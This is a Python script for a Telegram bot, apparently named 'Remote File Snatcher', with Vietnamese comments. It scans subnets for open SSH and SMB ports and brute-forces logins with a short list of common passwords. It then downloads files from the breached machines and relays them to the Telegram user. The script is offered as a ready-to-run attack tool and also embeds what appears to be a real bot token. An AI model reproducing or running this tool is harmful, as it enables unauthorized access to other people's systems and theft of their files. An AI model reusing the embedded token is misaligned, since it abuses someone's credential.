#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Bot Telegram: Remote File Snatcher (Hoàn chỉnh)
# Tác giả: palofsc
# Token: 8702411893:AAELXd_JyPwmv9J9HFE1Z582Xsz9XEwexEY

import os
import sys
import socket
import ipaddress
import tempfile
import threading
import time
import asyncio
import subprocess

# ---------- THƯ VIỆN BẮT BUỘC ----------
try:
    from telegram import Update
    from telegram.ext import Application, CommandHandler, ContextTypes
except ImportError:
    print("Cài: pip install python-telegram-bot")
    sys.exit(1)

try:
    import paramiko
except ImportError:
    paramiko = None
    print("Cài: pip install paramiko")

try:
    from impacket.smbconnection import SMBConnection
except ImportError:
    SMBConnection = None
    print("Cài: pip install impacket")

# ---------- CẤU HÌNH ----------
TOKEN = "8702411893:AAELXd_JyPwmv9J9HFE1Z582Xsz9XEwexEY"
WORDLIST = ["admin", "password", "123456", "root", "user", "test", "guest", "P@ssw0rd", "password123", "toor", "letmein"]
TIMEOUT = 2
SCAN_THREADS = 50

# ---------- HÀM QUÉT MẠNG ----------
def scan_ports(ip, ports):
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(TIMEOUT)
            conn = s.connect_ex((ip, port))
            if conn == 0:
                open_ports.append(port)
            s.close()
        except:
            pass
    return open_ports

def scan_subnet(subnet, ports=[22, 445, 3389, 139]):
    results = []
    try:
        net = ipaddress.ip_network(subnet, strict=False)
        hosts = list(net.hosts())
        def worker(host):
            ip = str(host)
            ports_open = scan_ports(ip, ports)
            if ports_open:
                results.append((ip, ports_open))
        threads = []
        for host in hosts:
            t = threading.Thread(target=worker, args=(host,))
            t.start()
            threads.append(t)
            if len(threads) >= SCAN_THREADS:
                for t in threads:
                    t.join()
                threads = []
        for t in threads:
            t.join()
    except Exception as e:
        return str(e)
    return results

# ---------- SSH ----------
def brute_ssh(ip, username, wordlist=None):
    if paramiko is None:
        return "LỖI: Thiếu paramiko"
    if wordlist is None:
        wordlist = WORDLIST
    for pwd in wordlist:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=username, password=pwd, timeout=TIMEOUT+1)
            client.close()
            return pwd
        except:
            continue
    return None

def get_file_ssh(ip, username, password, remote_path, local_path):
    if paramiko is None:
        return False
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password, timeout=5)
        sftp = client.open_sftp()
        sftp.get(remote_path, local_path)
        sftp.close()
        client.close()
        return True
    except:
        return False

# ---------- SMB ----------
def brute_smb(ip, username="", wordlist=None):
    if SMBConnection is None:
        return "LỖI: Thiếu impacket"
    if wordlist is None:
        wordlist = WORDLIST
    users = [username] if username else ["", "guest", "admin", "Administrator"]
    for user in users:
        for pwd in wordlist:
            try:
                conn = SMBConnection(ip, ip, timeout=TIMEOUT)
                conn.login(user, pwd)
                conn.close()
                return (user, pwd)
            except:
                pass
    return None

def get_file_smb(ip, username, password, remote_path, local_path):
    if SMBConnection is None:
        return False
    try:
        conn = SMBConnection(ip, ip, timeout=TIMEOUT)
        conn.login(username, password)
        if remote_path.startswith('\\\\'):
            parts = remote_path[2:].split('\\', 1)
            share = parts[0]
            path = parts[1].replace('\\', '/')
        else:
            parts = remote_path.split('/', 1)
            share = parts[0]
            path = parts[1] if len(parts) > 1 else ''
        with open(local_path, 'wb') as f:
            conn.getFile(share, path, f.write)
        conn.close()
        return True
    except:
        return False

# ---------- HÀM BOT ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 Remote File Snatcher Bot\n\n"
        "Lệnh:\n"
        "/scan <subnet> – Quét mạng (vd: /scan 192.168.1.0/24)\n"
        "/brutessh <ip> <username> – Brute SSH\n"
        "/getssh <ip> <user> <pass> <path> – Tải file SSH\n"
        "/brutesmb <ip> – Brute SMB\n"
        "/getsmb <ip> <user> <pass> <share/path> – Tải file SMB\n"
        "/help – Trợ giúp"
    )

async def scan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Thiếu subnet. VD: /scan 192.168.1.0/24")
        return
    subnet = args[0]
    await update.message.reply_text(f"⏳ Đang quét {subnet} ... (mất vài phút)")
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, scan_subnet, subnet)
    if isinstance(result, str):
        await update.message.reply_text(f"Lỗi: {result}")
        return
    if not result:
        await update.message.reply_text("Không tìm thấy máy nào.")
        return
    msg = "📡 Kết quả quét:\n"
    for ip, ports in result:
        msg += f"✅ {ip} - Mở: {ports}\n"
        if len(msg) > 4000:
            await update.message.reply_text(msg)
            msg = ""
    if msg:
        await update.message.reply_text(msg)

async def brutessh_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Cú pháp: /brutessh <ip> <username>")
        return
    ip, username = args[0], args[1]
    await update.message.reply_text(f"⏳ Brute SSH {ip}:{username} ...")
    loop = asyncio.get_event_loop()
    pwd = await loop.run_in_executor(None, brute_ssh, ip, username)
    if pwd and pwd != "LỖI: Thiếu paramiko":
        await update.message.reply_text(f"✅ Mật khẩu: `{pwd}`", parse_mode="Markdown")
    else:
        await update.message.reply_text(f"❌ Không tìm thấy. {pwd if pwd else ''}")

async def getssh_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 4:
        await update.message.reply_text("Cú pháp: /getssh <ip> <user> <pass> <remote_path>")
        return
    ip, user, pwd, remote = args[0], args[1], args[2], " ".join(args[3:])
    with tempfile.NamedTemporaryFile(delete=False, suffix='.download') as tmp:
        local = tmp.name
    await update.message.reply_text(f"⏳ Đang tải {remote} ...")
    loop = asyncio.get_event_loop()
    success = await loop.run_in_executor(None, get_file_ssh, ip, user, pwd, remote, local)
    if success:
        with open(local, 'rb') as f:
            await update.message.reply_document(document=f, filename=os.path.basename(remote))
        os.unlink(local)
    else:
        await update.message.reply_text("❌ Tải thất bại.")
        if os.path.exists(local):
            os.unlink(local)

async def brutesmb_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Cú pháp: /brutesmb <ip>")
        return
    ip = args[0]
    await update.message.reply_text(f"⏳ Brute SMB {ip} ...")
    loop = asyncio.get_event_loop()
    cred = await loop.run_in_executor(None, brute_smb, ip)
    if cred and cred != "LỖI: Thiếu impacket":
        user, pwd = cred
        await update.message.reply_text(f"✅ Tìm thấy: `{user}:{pwd}`", parse_mode="Markdown")
    else:
        await update.message.reply_text(f"❌ Không tìm thấy. {cred if cred else ''}")

async def getsmb_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 4:
        await update.message.reply_text("Cú pháp: /getsmb <ip> <user> <pass> <share/path>")
        return
    ip, user, pwd, remote = args[0], args[1], args[2], " ".join(args[3:])
    with tempfile.NamedTemporaryFile(delete=False, suffix='.download') as tmp:
        local = tmp.name
    await update.message.reply_text(f"⏳ Đang tải {remote} ...")
    loop = asyncio.get_event_loop()
    success = await loop.run_in_executor(None, get_file_smb, ip, user, pwd, remote, local)
    if success:
        with open(local, 'rb') as f:
            await update.message.reply_document(document=f, filename=os.path.basename(remote))
        os.unlink(local)
    else:
        await update.message.reply_text("❌ Tải thất bại.")
        if os.path.exists(local):
            os.unlink(local)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

# ---------- KHỞI CHẠY ----------
def main():
    if TOKEN == "YOUR_BOT_TOKEN":
        print("Chưa set token.")
        return

    # Kiểm tra thư viện
    if paramiko is None:
        print("⚠️ paramiko chưa cài -> SSH không dùng được.")
    if SMBConnection is None:
        print("⚠️ impacket chưa cài -> SMB không dùng được.")

    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("scan", scan_cmd))
    app.add_handler(CommandHandler("brutessh", brutessh_cmd))
    app.add_handler(CommandHandler("getssh", getssh_cmd))
    app.add_handler(CommandHandler("brutesmb", brutesmb_cmd))
    app.add_handler(CommandHandler("getsmb", getsmb_cmd))

    print("🤖 Bot đang chạy... (polling)")
    app.run_polling()

if __name__ == "__main__":
    main()
